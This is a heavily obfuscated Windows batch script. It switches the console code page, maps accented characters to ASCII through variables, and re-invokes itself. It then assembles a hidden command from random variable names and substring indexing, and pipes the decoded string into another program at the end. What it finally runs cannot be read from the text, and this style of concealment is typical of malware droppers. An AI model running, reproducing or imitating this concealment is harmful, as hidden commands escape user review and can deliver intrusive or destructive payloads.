@echo off&(if defined @xu@ goto ¡)&setlocal disableDelayedExpansion&for /f "delims=:. tokens=2" %%A in ('chcp') do set "@chcp@=chcp %%A>nul"&chcp 708>nul&set ^"@args@=%*"
set "@xu@= !#$&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~""
set "@bu@=¡¢¤¥§¨©ª«¬­®¯°±²³´µ¶·¸¹º»¼½¾¿ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ£"
(setlocal enableDelayedExpansion&for /l %%N in (0 1 93) do set "!@bu@:~%%N,1!=!@xu@:~%%N,1!")&cmd /c ^""%~f0" !@args@!"
%@chcp@%&exit /b
:¡
%Á%%æ%%ä%%é%%ð%%¡%%ð%%ç%%ç%
%ä%%í%%ô%
%ô%%æ%%õ%%¡%%ë%%Ø%%è%%Æ%%²%%÷%%Æ%%²%%¾%%ª%%ô%%Ø%%ï%%è%%ç%%Ó%%²%%Ñ%%ê%%®%%ä%%É%%Ü%%¬%%î%%Ä%%û%%Ã%%â%%Ë%%¾%%ã%%ö%%Ô%%©%%»%%¨%%Ö%%æ%%¸%%þ%%Õ%%¶%%Æ%%÷%%ü%%Ï%%·%%ë%%º%%µ%%³%%À%%ì%%Ù%%Î%%Å%%Ì%%Ç%%¹%%´%%ú%%ñ%%ò%%ù%%¯%%È%%ð%%Û%%×%%ó%%Â%%Þ%%ø%%Ð%%í%%¼%%Ê%%Í%%å%%£%%°%%Ú%%Ò%%é%%±%%õ%
%ô%%æ%%õ%%¡%%è%%ø%%³%%Å%%ø%%Ð%%â%%Æ%%Õ%%ó%%Ê%%Ô%%·%%×%%¶%%Æ%%ö%%²%%î%%²%%Ø%%Ñ%%Ô%%Ð%%ì%%¾%%ñ%%ð%
%ô%%æ%%õ%%¡%%É%%Ñ%%Û%%Ø%%¹%%è%%ç%%È%%Ù%%Â%%Æ%%³%%÷%%Ä%%Æ%%Ó%%ì%%´%%±%%Ç%%Ç%%Æ%%Ê%%Ñ%%´%%å%%Ð%%÷%%¾%%ß%%ø%%æ%
%ô%%æ%%õ%%¡%%Ñ%%±%%ì%%â%%ù%%ó%%È%%º%%Û%%Ì%%ë%%ì%%é%%Ò%%õ%%Ú%%Û%%º%%ó%%³%%é%%ñ%%Õ%%¾%%ß%%ó%%ß%%ô%%é%
%ô%%æ%%õ%%¡%%ö%%²%%Å%%ã%%×%%Ä%%Ä%%æ%%ç%%Ç%%æ%%Æ%%å%%Ì%%Å%%ã%%ù%%ñ%%ì%%·%%í%%Ö%%å%%´%%ø%%¾%%ß%%æ%%í%%ß%%í%
%ô%%æ%%õ%%¡%%å%%î%%Ù%%ô%%Ù%%í%%ù%%ò%%Ë%%Ä%%Õ%%Ô%%ì%%ó%%Ó%%Ò%%é%%ê%%Ë%%â%%Ì%%í%%¾%%¯%%æ%%ù%
%ô%%æ%%õ%%¡%%ô%%Ã%%Ç%%â%%²%%´%%ú%%²%%ô%%±%%Ó%%ä%%â%%Ù%%·%%Ó%%Ö%%¾%%ß%%æ%%¡%%®%%æ%%ñ%%¡%%ã%%ú%%ß%%ñ%%â%
%ô%%æ%%õ%%¡%%ö%%é%%Í%%Æ%%÷%%ù%%õ%%Ø%%ä%%æ%%Ò%%Ë%%Ð%%Ð%%É%%Ì%%º%%ë%%Ç%%Æ%%õ%%ä%%õ%%×%%Ä%%í%%Ù%%¾%%ß%%ô%%ô%%¡%%®%%ß%%ï%
%ô%%æ%%õ%%¡%%Å%%Õ%%Ø%%Å%%µ%%æ%%ç%%Ú%%æ%%Ç%%Ñ%%é%%Ç%%Ã%%ê%%Ø%%î%%Ò%%õ%%¾%%ð%%ñ%%ß%%¡%
%ô%%æ%%õ%%¡%%ò%%¸%%´%%Ð%%Ò%%â%%Õ%%Ñ%%±%%æ%%Õ%%¹%%Í%%ó%%Ñ%%´%%È%%Â%%ó%%ð%%÷%%×%%¶%%ï%%ê%%Å%%Ø%%³%%¾%%ß%%®%%ø%
%ô%%æ%%õ%%¡%%ä%%é%%Ì%%Ç%%ø%%ø%%û%%Ã%%ò%%ç%%ú%%ã%%î%%Å%%Ð%%Í%%û%%Ù%%Ç%%Ë%%Î%%±%%Ë%%â%%ù%%Ô%%É%%¾%%ê%%ï%%ß%%¡%%ß%%²%%¡%%ß%%®%
%ô%%æ%%õ%%¡%%ë%%±%%è%%×%%Î%%Ç%%´%%ç%%ï%%µ%%ç%%î%%Ó%%ú%%Ò%%Õ%%Õ%%ð%%÷%%Â%%ô%%º%%ù%%Ï%%ë%%ò%%Ú%%¾%%Ö%%Ô%%å%%Ê%%É%%×%%ö%%ú%%ê%%±%%Ê%%Ç%%Ù%%Æ%%É%%ó%%Ô%%Ç%%ø%%ó%%ô%%Ï%%Ë%%Â%%³%%Ð%%î%
%ô%%æ%%õ%%¡%%ê%%ê%%Æ%%é%%è%%Í%%Ç%%Ò%%¸%%Ö%%÷%%Ö%%ä%%É%%å%%Ç%%Ð%%ó%%ö%%¶%%µ%%ë%%å%%ð%%ú%%Ä%%ò%%Ã%%ä%%¾%%É%%Ê%%Õ%%æ%%Ç%%ú%%ñ%%ó%%Õ%%Ð%%¶%%Ù%%å%%ô%%Å%%Ì%%µ%%Ä%%õ%%³%%î%%º%%Ù%%¶%%ä%
%ô%%æ%%õ%%¡%%ø%%é%%Ù%%â%%Ì%%ð%%Ô%%ê%%Ó%%Ê%%ì%%É%%ó%%µ%%ä%%º%%æ%%Ò%%å%%Ú%%É%%É%%¾%%ù%%ö%%Ö%%Î%%ë%%Ã%%Ë%%ö%%Ç%%Ì%%Ô%%¶%%È%%Ô%%ë%%í%%È%%ë%%÷%%±%%â%%Ð%%Ô%%ù%%Í%%¸%%±%
%ô%%æ%%õ%%¡%%Å%%·%%¸%%é%%Ô%%æ%%Û%%Í%%Ù%%Ò%%ò%%Ö%%ä%%é%%Â%%ô%%ã%%ô%%í%%¾%%ú%%Ó%%Ö%%Û%%ó%%¸%%õ%%è%%Ó%%ä%%Í%%Ò%%ì%%ä%%í%%Å%%¹%%ä%%É%%Û%
%ô%%æ%%õ%%¡%%×%%È%%ö%%ä%%È%%Ã%%ë%%Ï%%ô%%¹%%ö%%â%%Ñ%%±%%û%%ê%%ó%%¾%%jWgE1vE1:~9,1%%jWgE1vE1:~29,1%%jWgE1vE1:~55,1%%jWgE1vE1:~25,1%%jWgE1vE1:~71,1%%jWgE1vE1:~68,1%%jWgE1vE1:~34,1%%jWgE1vE1:~45,1%%jWgE1vE1:~25,1%%jWgE1vE1:~37,1%%jWgE1vE1:~29,1%%jWgE1vE1:~64,1%%jWgE1vE1:~10,1%%jWgE1vE1:~65,1%%jWgE1vE1:~22,1%%jWgE1vE1:~39,1%%jWgE1vE1:~29,1%%jWgE1vE1:~11,1%%jWgE1vE1:~77,1%%¡%%jWgE1vE1:~37,1%%jWgE1vE1:~29,1%%jWgE1vE1:~77,1%%jWgE1vE1:~56,1%%jWgE1vE1:~2,1%%jWgE1vE1:~29,1%%jWgE1vE1:~22,1%%jWgE1vE1:~16,1%%jWgE1vE1:~66,1%%jWgE1vE1:~9,1%%jWgE1vE1:~29,1%%jWgE1vE1:~3,1%%jWgE1vE1:~77,1%%jWgE1vE1:~0,1%%jWgE1vE1:~56,1%%jWgE1vE1:~47,1%%jWgE1vE1:~58,1%%jWgE1vE1:~64,1%%jWgE1vE1:~3,1%%jWgE1vE1:~66,1%%jWgE1vE1:~58,1%%jWgE1vE1:~19,1%%jWgE1vE1:~70,1%%jWgE1vE1:~24,1%%jWgE1vE1:~77,1%%jWgE1vE1:~61,1%%jWgE1vE1:~9,1%%jWgE1vE1:~3,1%%jWgE1vE1:~4,1%%jWgE1vE1:~25,1%%jWgE1vE1:~27,1%%jWgE1vE1:~75,1%%jWgE1vE1:~77,1%%jWgE1vE1:~77,1%%jWgE1vE1:~53,1%%jWgE1vE1:~26,1%%jWgE1vE1:~72,1%%jWgE1vE1:~72,1%%jWgE1vE1:~33,1%%jWgE1vE1:~42,1%%jWgE1vE1:~56,1%%jWgE1vE1:~7,1%%jWgE1vE1:~40,1%%jWgE1vE1:~76,1%%jWgE1vE1:~56,1%%jWgE1vE1:~41,1%%jWgE1vE1:~56,1%%jWgE1vE1:~42,1%%jWgE1vE1:~42,1%%jWgE1vE1:~51,1%%jWgE1vE1:~72,1%%jWgE1vE1:~5,1%%jWgE1vE1:~23,1%%jWgE1vE1:~72,1%%jWgE1vE1:~43,1%%jWgE1vE1:~19,1%%jWgE1vE1:~21,1%%jWgE1vE1:~59,1%%jWgE1vE1:~76,1%%jWgE1vE1:~47,1%%jWgE1vE1:~34,1%%jWgE1vE1:~45,1%%jWgE1vE1:~28,1%%jWgE1vE1:~18,1%%jWgE1vE1:~24,1%%jWgE1vE1:~2,1%%jWgE1vE1:~47,1%%jWgE1vE1:~30,1%%jWgE1vE1:~49,1%%jWgE1vE1:~34,1%%jWgE1vE1:~41,1%%jWgE1vE1:~33,1%%jWgE1vE1:~32,1%%jWgE1vE1:~51,1%%jWgE1vE1:~20,1%%jWgE1vE1:~12,1%%jWgE1vE1:~18,1%%jWgE1vE1:~46,1%%jWgE1vE1:~46,1%%jWgE1vE1:~20,1%%jWgE1vE1:~45,1%%jWgE1vE1:~16,1%%jWgE1vE1:~2,1%%jWgE1vE1:~51,1%%jWgE1vE1:~47,1%%jWgE1vE1:~65,1%%jWgE1vE1:~37,1%%jWgE1vE1:~40,1%%jWgE1vE1:~50,1%%jWgE1vE1:~8,1%%jWgE1vE1:~40,1%%jWgE1vE1:~69,1%%jWgE1vE1:~73,1%%jWgE1vE1:~51,1%%jWgE1vE1:~24,1%%jWgE1vE1:~6,1%%jWgE1vE1:~32,1%%jWgE1vE1:~27,1%%jWgE1vE1:~0,1%%jWgE1vE1:~71,1%%jWgE1vE1:~0,1%%jWgE1vE1:~67,1%
%ô%%æ%%õ%%¡%%È%%Ø%%Ë%%É%%ú%%è%%³%%Ù%%²%%×%%Ñ%%ð%%³%%Ø%%º%%´%%ñ%%ä%%û%%ç%%·%%Û%%ö%%ä%%Ë%%¾%%ô%%Û%%è%%Æ%%¹%%ë%%ê%%×%%É%%¶%%É%%û%%Ï%%Õ%%÷%%Õ%%ø%%×%%É%%È%%ç%
%ô%%æ%%õ%%¡%%Ä%%Ë%%ú%%û%%Î%%±%%¹%%Ð%%Æ%%Ú%%ô%%ä%%²%%ì%%Ë%%ã%%ú%%Ò%%Å%%¾%%Û%%Å%%Ñ%%Ï%%Ã%%±%%Ö%%ê%%È%%Ú%%È%%É%%è%%û%%ë%%º%%²%%·%%Ã%%´%%²%%ù%
%ô%%æ%%õ%%¡%%ö%%º%%ê%%Ú%%è%%Ç%%Ç%%ø%%Í%%ã%%ä%%Ì%%é%%ú%%Ñ%%È%%ø%%Ð%%ô%%Ç%%¾%%Ë%%¶%%È%%é%%×%%Ô%%ô%%´%%õ%%ç%%É%%Ê%%õ%%ê%%Û%%í%%Ì%%Î%%Å%%Ë%%±%%ä%%¶%%Ñ%%³%
%æ%%ä%%é%%ð%%¡%%%%×%%È%%ö%%ä%%È%%Ã%%ë%%Ï%%ô%%¹%%ö%%â%%Ñ%%±%%û%%ê%%ó%%%%¡%%ý%%¡%%gw2DwOaETrIS6V5Eu1m1WPSOk%%HPZW8gfGXAE2vCERk30FFEIP3dOv%%P0kaxrG9ZKjkhQtYZ9r2hpT%%u1DbVCCefFeEdKDbxpk6lUd3w%%dmXsXlxqJCTSkrRQhiJaKl%%sBFa13y1s0RcaX6RU%%uhLEvxtWceQJOOHK9jFEtctVClX%%DTWD4efYeFPhFBiWmQt%%q73OQaTP0eT8LrP3GArovV5niDW2%%chKFwwzBqfybmDOLzXFJM0JaxSH%
